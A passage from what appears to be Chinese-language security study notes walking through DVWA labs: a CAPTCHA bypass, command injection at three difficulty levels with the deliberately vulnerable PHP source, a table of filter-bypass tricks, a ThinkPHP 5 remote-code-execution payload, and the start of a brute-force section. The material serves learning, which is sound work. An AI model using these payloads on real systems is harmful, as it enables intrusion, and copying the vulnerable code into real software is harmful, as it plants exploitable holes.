class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes. &lt;br /&gt;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">            &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;&quot;</span> . <span class="variable">$pass_new</span> . <span class="string">&quot;\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;&quot;</span> . <span class="variable">$pass_conf</span> . <span class="string">&quot;\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=\&quot;hidden\&quot; name=\&quot;passed_captcha\&quot; value=\&quot;true\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;&quot;</span>;</span><br><span class="line">            &#125;    </span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Both passwords must match &lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;Change&#x27;</span>] ) &amp;&amp; ( <span class="variable">$_POST</span>[<span class="string">&#x27;step&#x27;</span>] == <span class="string">&#x27;2&#x27;</span> ) ) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$_POST</span>[<span class="string">&#x27;passed_captcha&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA. Bad hacker, no doughnut.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass_new</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>))&#123;</span><br><span class="line">               <span class="variable">$pass_new</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$pass_new</span>);</span><br><span class="line">               <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass_new</span>);</span><br><span class="line"></span><br><span class="line">               <span class="variable">$insert</span>=<span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">               <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$insert</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;</span>;</span><br><span class="line">               <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Passwords did not match. &lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>在第二步可以看到多了一个if语句用来验证验证码，要求 $_POST[‘passed_captcha’]为真。只要在修改包的时候多添加一个参数passed_captcha=true即可。</p>
<h2 id="6-3-不安全验证码-高"><a href="#6-3-不安全验证码-高" class="headerlink" title="6.3 不安全验证码[高]"></a>6.3 不安全验证码[高]</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;Change&#x27;</span>] ) &amp;&amp; ( <span class="variable">$_POST</span>[<span class="string">&#x27;step&#x27;</span>] == <span class="string">&#x27;1&#x27;</span> ) ) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password_new&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass_new</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass_new</span> );</span><br><span class="line">    <span class="variable">$pass_new</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$pass_new</span> );</span><br><span class="line">    <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password_conf&#x27;</span>];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass_conf</span> );</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$pass_conf</span> );</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_conf</span> );</span><br><span class="line">    </span><br><span class="line">        <span class="variable">$resp</span> = <span class="title function_ invoke__">recaptcha_check_answer</span> (<span class="variable">$_DVWA</span>[<span class="string">&#x27;recaptcha_private_key&#x27;</span>],</span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&quot;recaptcha_challenge_field&quot;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&quot;recaptcha_response_field&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$resp</span>-&gt;is_valid) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// Check that the current password is correct</span></span><br><span class="line">        <span class="variable">$qry</span> = <span class="string">&quot;SELECT password FROM `users` WHERE user=&#x27;admin&#x27; AND password=&#x27;<span class="subst">$pass_curr</span>&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$qry</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> ((<span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>)  &amp;&amp; ( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysql_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ))&#123;</span><br><span class="line">                       <span class="variable">$insert</span>=<span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">                       <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$insert</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">                       <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;</span>;</span><br><span class="line">                       <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                       <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Either your current password is incorrect or the new passwords did not match. Please try again. &lt;/pre&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>这种加上原密码再加上验证基本很难攻击。</p>
<h1 id="7-命令执行漏洞"><a href="#7-命令执行漏洞" class="headerlink" title="7. 命令执行漏洞"></a>7. 命令执行漏洞</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">windows或linux下：</span><br><span class="line">command1 &amp;&amp; command2	先执行1再执行2</span><br><span class="line">command1 || command2	先执行1，1为假再执行2</span><br><span class="line">command1 &amp; command2		先执行2再执行1</span><br><span class="line">command1 | command2		只执行2</span><br></pre></td></tr></table></figure>
<p>在过滤情况下的解决办法：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>过滤关键字</th>
<th>解决方法</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>cat</td>
<td>ca\t、ca’’t、a=c;b=at;$a$b xxx、less xxx</td>
<td></td>
</tr>
<tr>
<td>空格</td>
<td>$IFS$9、&lt;、&lt;&gt;、%20(space)、%09(tab)</td>
<td>$IFS是bash中的内部域分隔符，可以代替空格。后面的$9数字是可以随意的，每个数字都有特殊含义，但是和前面的搭配都可以表示空格。</td>
</tr>
<tr>
<td>目录分隔符/</td>
<td>cd flag文件所在目录后在cat flag文件</td>
<td>ls后用反斜杠\查看目录里的文件，比如：ls \flag_is_here</td>
</tr>
<tr>
<td>&amp;、\</td>
<td></td>
<td>用；来分隔命令</td>
<td></td>
</tr>
<tr>
<td>；</td>
<td>%0a</td>
<td></td>
</tr>
<tr>
<td>flag</td>
<td>fla*</td>
<td>不用知道flag的具体名字</td>
</tr>
</tbody>
</table>
</div>
<h2 id="7-1-ThinkPHP-5漏洞"><a href="#7-1-ThinkPHP-5漏洞" class="headerlink" title="7.1 ThinkPHP 5漏洞"></a>7.1 ThinkPHP 5漏洞</h2><p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls /</span><br><span class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</span><br></pre></td></tr></table></figure>
<h2 id="7-2-命令执行漏洞-低"><a href="#7-2-命令执行漏洞-低" class="headerlink" title="7.2 命令执行漏洞[低]"></a>7.2 命令执行漏洞[低]</h2><p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;submit&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="title function_ invoke__">php_uname</span>(<span class="string">&#x27;s&#x27;</span>), <span class="string">&#x27;Windows NT&#x27;</span>)) &#123; </span><br><span class="line">    </span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="variable">$cmd</span>.<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    </span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 3 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="variable">$cmd</span>.<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>这段代码相当于cmd的ping功能：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.008 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.022 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.019 ms</span><br><span class="line"></span><br><span class="line">--- 127.0.0.1 ping statistics ---</span><br><span class="line">3 packets transmitted, 3 received, 0% packet loss, time 2011ms</span><br><span class="line">rtt min/avg/max/mdev = 0.008/0.016/0.022/0.006 ms</span><br></pre></td></tr></table></figure>
<p>但如果利用合并命令，可以执行ping以外的其他功能，例如<strong>127.0.0.1&amp;&amp;pwd</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.008 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.017 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.017 ms</span><br><span class="line"></span><br><span class="line">--- 127.0.0.1 ping statistics ---</span><br><span class="line">3 packets transmitted, 3 received, 0% packet loss, time 2019ms</span><br><span class="line">rtt min/avg/max/mdev = 0.008/0.014/0.017/0.004 ms</span><br><span class="line">/owaspbwa/dvwa-git/vulnerabilities/exec</span><br></pre></td></tr></table></figure>
<p>pwd 命令用作显示工作目录的路径名称 。</p>
<h2 id="7-2-命令执行漏洞-中"><a href="#7-2-命令执行漏洞-中" class="headerlink" title="7.2 命令执行漏洞[中]"></a>7.2 命令执行漏洞[中]</h2><p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;submit&#x27;</span>] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="title function_ invoke__">php_uname</span>(<span class="string">&#x27;s&#x27;</span>), <span class="string">&#x27;Windows NT&#x27;</span>)) &#123; </span><br><span class="line">    </span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="variable">$cmd</span>.<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    </span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 3 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="variable">$cmd</span>.<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>代码是将&amp;&amp;和；都替换成空，但我们可以用||，只要前面条件为假，就执行后面的命令。例如：<strong>hello || ls</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">help</span><br><span class="line">index.php</span><br><span class="line">source</span><br></pre></td></tr></table></figure>
<h2 id="7-3-命令执行漏洞-高"><a href="#7-3-命令执行漏洞-高" class="headerlink" title="7.3 命令执行漏洞[高]"></a>7.3 命令执行漏洞[高]</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;submit&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;ip&quot;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$target</span> );</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">    <span class="variable">$octet</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$target</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$octet</span>[<span class="number">0</span>])) &amp;&amp; (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$octet</span>[<span class="number">1</span>])) &amp;&amp; (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$octet</span>[<span class="number">2</span>])) &amp;&amp; (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$octet</span>[<span class="number">3</span>])) &amp;&amp; (<span class="title function_ invoke__">sizeof</span>(<span class="variable">$octet</span>) == <span class="number">4</span>)  ) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>].<span class="string">&#x27;.&#x27;</span>.<span class="variable">$octet</span>[<span class="number">1</span>].<span class="string">&#x27;.&#x27;</span>.<span class="variable">$octet</span>[<span class="number">2</span>].<span class="string">&#x27;.&#x27;</span>.<span class="variable">$octet</span>[<span class="number">3</span>];</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="title function_ invoke__">php_uname</span>(<span class="string">&#x27;s&#x27;</span>), <span class="string">&#x27;Windows NT&#x27;</span>)) &#123; </span><br><span class="line">    </span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="variable">$cmd</span>.<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    </span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 3 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="variable">$cmd</span>.<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>对获取的ip值，先去下划线处理，然后根据’.’来分成数组，判断是否分成四份且每一份是数字的，然后还原回去，对ip值进行ping操作，否则判定输入ip值为非法ip格式。经过这样的处理，输入的只能是ip格式的参数，确保了执行输入参数的安全性。 </p>
<h1 id="8-暴力破解"><a href="#8-暴力破解" class="headerlink" title="8. 暴力破解"></a>8. 暴力破解</h1><p>暴力破解的关键是字典。用crunch生成字典：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crunch [min] [max] [characters] -t[patterns] -o[filename]</span><br><span class="line"></span><br><span class="line">crunch 6 8 abc123q -t a@@@@b -o test.txt</span><br><span class="line">创建一个至少6个字符，至多8个字符，由abc123q生成的由a开头由b结尾的test.txt字典。</span><br></pre></td></tr></table></figure>
<h2 id="8-1-网页密码暴力破解-低"><a href="#8-1-网页密码暴力破解-低" class="headerlink" title="8.1 网页密码暴力破解[低]"></a>8.1 网页密码暴力破解[低]</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">burp suite</span><br></pre></td></tr></table></figure>
<p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[<span class="string">&#x27;Login&#x27;</span>] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$qry</span> = <span class="string">&quot;SELECT * FROM `users` WHERE user=&#x27;<span class="subst">$user</span>&#x27; AND password=&#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>( <span class="variable">$qry</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysql_num_rows</span>( 